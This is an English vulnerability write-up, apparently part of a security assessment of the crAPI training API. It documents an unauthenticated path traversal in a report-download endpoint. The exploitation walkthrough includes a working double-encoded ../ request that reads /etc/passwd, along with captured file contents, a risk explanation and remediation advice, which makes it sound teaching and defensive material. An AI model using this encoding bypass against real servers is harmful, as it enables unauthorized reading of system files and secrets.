[🇧🇷 Português](../../vulnerabilidades/12-path-traversal.md) · 🇺🇸 English

# Path Traversal / LFI — unauthenticated arbitrary file read

**OWASP API Security Top 10 (2023) category:** Path Traversal / LFI — not a standalone category in the 2023 Top 10; relates to input validation and `API8 — Security Misconfiguration`.
**Severity (CVSS v3.1):** `High · 7.5` — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**Matching crAPI challenge:** report download with a user-controlled `filename`

---

## 1. Summary

The `download_report` endpoint (unauthenticated — see [Unauthenticated access](11-unauth-access.md)) builds the file path from the `filename` parameter. There is a character allow-list, but it is checked **before** URL-decoding (`unquote`). With **double-encoding** (`%252e` → `%2e` → `.`), the attacker bypasses validation and reads **arbitrary files** from the server (e.g. `/etc/passwd`).

## 2. Preconditions

- None (unauthenticated endpoint).

## 3. Exploitation walkthrough

1. A simple `filename` reveals the base directory and confirms token-free access:

```http
GET /workshop/api/mechanic/download_report?filename=test HTTP/1.1
Host: localhost:8888
```
→ `404 {"message":"File not found at '/app/reports/test'."}`

2. `../` encoded once is blocked — the **gateway decodes before Django**, so validation sees `../` and rejects it (`400 Invalid input`).

3. With **double-encoding**, the gateway decodes to `%2e%2e%2f` (which passes the allow-list, since they are `%HH`), and Django's `unquote` decodes to `../`:

```http
GET /workshop/api/mechanic/download_report?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1
Host: localhost:8888
```

## 4. Evidence

**Confirmed against the local instance** — capture in [`evidencias/12-path-traversal/captura.txt`](../../../evidencias/12-path-traversal/captura.txt).

```
1) filename=test                  -> 404  /app/reports/test          (leaks the base path)
2) ../ (single-encoded)           -> 400  Invalid input              (gateway decodes, validation blocks)
3) ../ (DOUBLE-encoded) + etc/passwd -> 200  (contents of /etc/passwd):
   root:x:0:0:root:/root:/bin/sh
   bin:x:1:1:bin:/bin:/sbin/nologin
   daemon:x:2:2:daemon:/sbin:/sbin/nologin
   ...
```

Reading `/etc/passwd` **without authentication** proves the path traversal / local file inclusion (LFI).

## 5. Why it is a risk

Arbitrary file read exposes secrets (keys, configs, credentials in files), source code, and server data — often a step toward a larger compromise. The cause here is a classic anti-pattern: **validating before normalizing/decoding**. The correct order is to decode/normalize first and validate the final result.

## 6. How to fix

- **Decode/normalize first, validate afterward** — and validate the **resolved** path (`realpath`), ensuring it stays within the allowed directory.
- Do not build paths by concatenating user input; map to a safe identifier (e.g. a report id) instead of a free-form filename.
- Enforce authentication and authorization on the endpoint (see [item 11](11-unauth-access.md)).

## 7. References

- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [API8:2023 Security Misconfiguration](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)
